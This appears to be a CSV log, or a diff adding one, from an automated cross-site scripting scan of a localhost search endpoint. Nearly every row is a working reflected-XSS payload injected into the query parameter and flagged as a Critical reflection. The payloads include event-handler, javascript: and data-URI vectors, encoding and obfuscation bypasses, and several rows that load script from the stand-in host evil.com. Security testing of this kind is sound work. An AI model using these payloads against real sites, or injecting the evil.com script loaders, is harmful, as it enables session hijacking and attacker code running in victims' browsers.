+2026-01-10 16:23:32.785,2026-01-10 16:23:32.788,0.003,http://localhost:3000/search,GET,q,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.788,2026-01-10 16:23:32.791,0.002,http://localhost:3000/search,GET,q,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.791,2026-01-10 16:23:32.797,0.007,http://localhost:3000/search,GET,q,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.797,2026-01-10 16:23:32.802,0.004,http://localhost:3000/search,GET,q,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.802,2026-01-10 16:23:32.804,0.003,http://localhost:3000/search,GET,q,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.804,2026-01-10 16:23:32.807,0.003,http://localhost:3000/search,GET,q,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.807,2026-01-10 16:23:32.814,0.007,http://localhost:3000/search,GET,q,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.814,2026-01-10 16:23:32.819,0.004,http://localhost:3000/search,GET,q,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.819,2026-01-10 16:23:32.822,0.003,http://localhost:3000/search,GET,q,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.822,2026-01-10 16:23:32.825,0.003,http://localhost:3000/search,GET,q,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.825,2026-01-10 16:23:32.828,0.002,http://localhost:3000/search,GET,q,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.828,2026-01-10 16:23:32.831,0.003,http://localhost:3000/search,GET,q,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.831,2026-01-10 16:23:32.838,0.007,http://localhost:3000/search,GET,q,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.838,2026-01-10 16:23:32.841,0.004,http://localhost:3000/search,GET,q,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.842,2026-01-10 16:23:32.845,0.003,http://localhost:3000/search,GET,q,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.845,2026-01-10 16:23:32.847,0.003,http://localhost:3000/search,GET,q,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.847,2026-01-10 16:23:32.854,0.006,http://localhost:3000/search,GET,q,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.854,2026-01-10 16:23:32.858,0.005,http://localhost:3000/search,GET,q,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.858,2026-01-10 16:23:32.861,0.003,http://localhost:3000/search,GET,q,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.861,2026-01-10 16:23:32.868,0.007,http://localhost:3000/search,GET,q,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.869,2026-01-10 16:23:32.872,0.003,http://localhost:3000/search,GET,q,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.872,2026-01-10 16:23:32.875,0.003,http://localhost:3000/search,GET,q,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.875,2026-01-10 16:23:32.878,0.003,http://localhost:3000/search,GET,q,<table><caption onmouseover=alert(1)>X</caption></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.878,2026-01-10 16:23:32.881,0.003,http://localhost:3000/search,GET,q,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.881,2026-01-10 16:23:32.888,0.007,http://localhost:3000/search,GET,q,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.888,2026-01-10 16:23:32.892,0.004,http://localhost:3000/search,GET,q,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.892,2026-01-10 16:23:32.896,0.003,http://localhost:3000/search,GET,q,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.896,2026-01-10 16:23:32.899,0.003,http://localhost:3000/search,GET,q,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.899,2026-01-10 16:23:32.908,0.009,http://localhost:3000/search,GET,q,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.908,2026-01-10 16:23:32.912,0.004,http://localhost:3000/search,GET,q,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.912,2026-01-10 16:23:32.920,0.008,http://localhost:3000/search,GET,q,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.920,2026-01-10 16:23:32.925,0.004,http://localhost:3000/search,GET,q,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.925,2026-01-10 16:23:32.929,0.004,http://localhost:3000/search,GET,q,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.929,2026-01-10 16:23:32.932,0.003,http://localhost:3000/search,GET,q,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.932,2026-01-10 16:23:32.940,0.008,http://localhost:3000/search,GET,q,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.940,2026-01-10 16:23:32.944,0.004,http://localhost:3000/search,GET,q,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.944,2026-01-10 16:23:32.948,0.004,http://localhost:3000/search,GET,q,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.948,2026-01-10 16:23:32.957,0.009,http://localhost:3000/search,GET,q,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.957,2026-01-10 16:23:32.962,0.005,http://localhost:3000/search,GET,q,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.962,2026-01-10 16:23:32.965,0.003,http://localhost:3000/search,GET,q,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.965,2026-01-10 16:23:32.969,0.004,http://localhost:3000/search,GET,q,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.969,2026-01-10 16:23:32.977,0.008,http://localhost:3000/search,GET,q,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.977,2026-01-10 16:23:32.980,0.003,http://localhost:3000/search,GET,q,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.980,2026-01-10 16:23:32.989,0.009,http://localhost:3000/search,GET,q,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.989,2026-01-10 16:23:32.994,0.004,http://localhost:3000/search,GET,q,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.994,2026-01-10 16:23:32.998,0.004,http://localhost:3000/search,GET,q,<strong onmouseover=alert(1)>X</strong>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.998,2026-01-10 16:23:33.005,0.007,http://localhost:3000/search,GET,q,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.005,2026-01-10 16:23:33.008,0.003,http://localhost:3000/search,GET,q,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.008,2026-01-10 16:23:33.013,0.004,http://localhost:3000/search,GET,q,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.013,2026-01-10 16:23:33.015,0.003,http://localhost:3000/search,GET,q,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.015,2026-01-10 16:23:33.022,0.007,http://localhost:3000/search,GET,q,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.022,2026-01-10 16:23:33.026,0.004,http://localhost:3000/search,GET,q,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.026,2026-01-10 16:23:33.030,0.004,http://localhost:3000/search,GET,q,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.030,2026-01-10 16:23:33.033,0.004,http://localhost:3000/search,GET,q,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.033,2026-01-10 16:23:33.040,0.007,http://localhost:3000/search,GET,q,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.040,2026-01-10 16:23:33.044,0.004,http://localhost:3000/search,GET,q,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.044,2026-01-10 16:23:33.047,0.003,http://localhost:3000/search,GET,q,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.047,2026-01-10 16:23:33.050,0.003,http://localhost:3000/search,GET,q,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.050,2026-01-10 16:23:33.058,0.008,http://localhost:3000/search,GET,q,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.058,2026-01-10 16:23:33.062,0.004,http://localhost:3000/search,GET,q,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.062,2026-01-10 16:23:33.066,0.004,http://localhost:3000/search,GET,q,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.066,2026-01-10 16:23:33.075,0.008,http://localhost:3000/search,GET,q,<section onmouseover=alert(1)>X</section>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.075,2026-01-10 16:23:33.080,0.005,http://localhost:3000/search,GET,q,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.080,2026-01-10 16:23:33.084,0.005,http://localhost:3000/search,GET,q,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.084,2026-01-10 16:23:33.092,0.008,http://localhost:3000/search,GET,q,<figcaption onmouseover=alert(1)>X</figcaption>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.092,2026-01-10 16:23:33.096,0.004,http://localhost:3000/search,GET,q,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.096,2026-01-10 16:23:33.100,0.004,http://localhost:3000/search,GET,q,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.100,2026-01-10 16:23:33.103,0.003,http://localhost:3000/search,GET,q,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.103,2026-01-10 16:23:33.111,0.008,http://localhost:3000/search,GET,q,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.111,2026-01-10 16:23:33.116,0.004,http://localhost:3000/search,GET,q,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.116,2026-01-10 16:23:33.120,0.004,http://localhost:3000/search,GET,q,<button onclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.120,2026-01-10 16:23:33.123,0.003,http://localhost:3000/search,GET,q,<button ondblclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.123,2026-01-10 16:23:33.131,0.008,http://localhost:3000/search,GET,q,<button onmousedown=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.131,2026-01-10 16:23:33.135,0.004,http://localhost:3000/search,GET,q,<button onmouseup=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.135,2026-01-10 16:23:33.139,0.003,http://localhost:3000/search,GET,q,"""><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.139,2026-01-10 16:23:33.141,0.003,http://localhost:3000/search,GET,q,'><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.141,2026-01-10 16:23:33.152,0.011,http://localhost:3000/search,GET,q,"""></script><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.152,2026-01-10 16:23:33.156,0.004,http://localhost:3000/search,GET,q,';alert(1);//,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.156,2026-01-10 16:23:33.164,0.008,http://localhost:3000/search,GET,q,""";alert(1);//",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.164,2026-01-10 16:23:33.170,0.006,http://localhost:3000/search,GET,q,""" onmouseover=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.170,2026-01-10 16:23:33.174,0.004,http://localhost:3000/search,GET,q,"""onmouseover=""alert(1)",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.174,2026-01-10 16:23:33.183,0.009,http://localhost:3000/search,GET,q,' onmouseover=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.183,2026-01-10 16:23:33.188,0.005,http://localhost:3000/search,GET,q,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.188,2026-01-10 16:23:33.191,0.004,http://localhost:3000/search,GET,q,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.191,2026-01-10 16:23:33.200,0.009,http://localhost:3000/search,GET,q,</script><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.200,2026-01-10 16:23:33.203,0.003,http://localhost:3000/search,GET,q,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.203,2026-01-10 16:23:33.207,0.003,http://localhost:3000/search,GET,q,</script><svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.207,2026-01-10 16:23:33.215,0.008,http://localhost:3000/search,GET,q,--><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.215,2026-01-10 16:23:33.220,0.005,http://localhost:3000/search,GET,q,--!><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.220,2026-01-10 16:23:33.223,0.003,http://localhost:3000/search,GET,q,<q/oncut=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.223,2026-01-10 16:23:33.231,0.008,http://localhost:3000/search,GET,q,<q/onclick=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.231,2026-01-10 16:23:33.236,0.005,http://localhost:3000/search,GET,q,<q/ondrag=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.236,2026-01-10 16:23:33.240,0.004,http://localhost:3000/search,GET,q,<q/onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.240,2026-01-10 16:23:33.248,0.008,http://localhost:3000/search,GET,q,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.248,2026-01-10 16:23:33.251,0.003,http://localhost:3000/search,GET,q,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.251,2026-01-10 16:23:33.256,0.005,http://localhost:3000/search,GET,q,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.256,2026-01-10 16:23:33.263,0.008,http://localhost:3000/search,GET,q,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.264,2026-01-10 16:23:33.268,0.004,http://localhost:3000/search,GET,q,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.268,2026-01-10 16:23:33.271,0.003,http://localhost:3000/search,GET,q,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.271,2026-01-10 16:23:33.274,0.003,http://localhost:3000/search,GET,q,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.274,2026-01-10 16:23:33.281,0.008,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1) onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.281,2026-01-10 16:23:33.286,0.004,http://localhost:3000/search,GET,q,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.286,2026-01-10 16:23:33.289,0.003,http://localhost:3000/search,GET,q,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.289,2026-01-10 16:23:33.297,0.008,http://localhost:3000/search,GET,q,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.297,2026-01-10 16:23:33.300,0.004,http://localhost:3000/search,GET,q,<video poster=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.301,2026-01-10 16:23:33.304,0.003,http://localhost:3000/search,GET,q,<html manifest=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.304,2026-01-10 16:23:33.307,0.003,http://localhost:3000/search,GET,q,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.307,2026-01-10 16:23:33.314,0.007,http://localhost:3000/search,GET,q,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.314,2026-01-10 16:23:33.318,0.004,http://localhost:3000/search,GET,q,<img dynsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.318,2026-01-10 16:23:33.321,0.003,http://localhost:3000/search,GET,q,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.321,2026-01-10 16:23:33.324,0.003,http://localhost:3000/search,GET,q,<a href=about:blank>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.324,2026-01-10 16:23:33.333,0.009,http://localhost:3000/search,GET,q,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.333,2026-01-10 16:23:33.336,0.003,http://localhost:3000/search,GET,q,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.336,2026-01-10 16:23:33.340,0.003,http://localhost:3000/search,GET,q,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.340,2026-01-10 16:23:33.347,0.007,http://localhost:3000/search,GET,q,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.347,2026-01-10 16:23:33.351,0.004,http://localhost:3000/search,GET,q,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.351,2026-01-10 16:23:33.354,0.003,http://localhost:3000/search,GET,q,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.354,2026-01-10 16:23:33.357,0.003,http://localhost:3000/search,GET,q,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.357,2026-01-10 16:23:33.364,0.007,http://localhost:3000/search,GET,q,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.364,2026-01-10 16:23:33.368,0.004,http://localhost:3000/search,GET,q,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.368,2026-01-10 16:23:33.372,0.004,http://localhost:3000/search,GET,q,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.372,2026-01-10 16:23:33.374,0.003,http://localhost:3000/search,GET,q,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.374,2026-01-10 16:23:33.383,0.009,http://localhost:3000/search,GET,q,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.383,2026-01-10 16:23:33.387,0.004,http://localhost:3000/search,GET,q,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.387,2026-01-10 16:23:33.390,0.003,http://localhost:3000/search,GET,q,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.390,2026-01-10 16:23:33.397,0.008,http://localhost:3000/search,GET,q,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.397,2026-01-10 16:23:33.401,0.004,http://localhost:3000/search,GET,q,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.401,2026-01-10 16:23:33.404,0.003,http://localhost:3000/search,GET,q,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.404,2026-01-10 16:23:33.408,0.003,http://localhost:3000/search,GET,q,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.408,2026-01-10 16:23:33.416,0.009,http://localhost:3000/search,GET,q,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.416,2026-01-10 16:23:33.419,0.003,http://localhost:3000/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.420,2026-01-10 16:23:33.423,0.003,http://localhost:3000/search,GET,q,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.423,2026-01-10 16:23:33.430,0.007,http://localhost:3000/search,GET,q,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.430,2026-01-10 16:23:33.434,0.004,http://localhost:3000/search,GET,q,<applet code=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.434,2026-01-10 16:23:33.437,0.003,http://localhost:3000/search,GET,q,<script>al\u0065rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.437,2026-01-10 16:23:33.440,0.003,http://localhost:3000/search,GET,q,<script>al\x65rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.440,2026-01-10 16:23:33.448,0.008,http://localhost:3000/search,GET,q,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.448,2026-01-10 16:23:33.452,0.004,http://localhost:3000/search,GET,q,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.452,2026-01-10 16:23:33.456,0.004,http://localhost:3000/search,GET,q,<script>[1].find(alert)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.456,2026-01-10 16:23:33.464,0.008,http://localhost:3000/search,GET,q,<script>top['al'+'ert'](1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.464,2026-01-10 16:23:33.467,0.003,http://localhost:3000/search,GET,q,<script>top[/al/.source+/ert/.source](1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.467,2026-01-10 16:23:33.470,0.004,http://localhost:3000/search,GET,q,<script>top[8680439..toString(30)](1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.470,2026-01-10 16:23:33.473,0.003,http://localhost:3000/search,GET,q,&lt;script&gt;alert(1)&lt;/script&gt;,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.473,2026-01-10 16:23:33.480,0.007,http://localhost:3000/search,GET,q,&#60;script&#62;alert(1)&#60;/script&#62;,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.480,2026-01-10 16:23:33.484,0.004,http://localhost:3000/search,GET,q,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.484,2026-01-10 16:23:33.487,0.003,http://localhost:3000/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.487,2026-01-10 16:23:33.490,0.004,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.490,2026-01-10 16:23:33.498,0.007,http://localhost:3000/search,GET,q,<script/src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.498,2026-01-10 16:23:33.502,0.004,http://localhost:3000/search,GET,q,<script	src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.502,2026-01-10 16:23:33.505,0.003,http://localhost:3000/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.505,2026-01-10 16:23:33.507,0.002,http://localhost:3000/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.507,2026-01-10 16:23:33.515,0.007,http://localhost:3000/search,GET,q,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.515,2026-01-10 16:23:33.519,0.005,http://localhost:3000/search,GET,q,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.520,2026-01-10 16:23:33.522,0.003,http://localhost:3000/search,GET,q,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.522,2026-01-10 16:23:33.529,0.007,http://localhost:3000/search,GET,q,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.529,2026-01-10 16:23:33.535,0.005,http://localhost:3000/search,GET,q,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.535,2026-01-10 16:23:33.538,0.003,http://localhost:3000/search,GET,q,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:33.538,2026-01-10 16:23:33.541,0.003,http://localhost:3000/search,GET,q,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
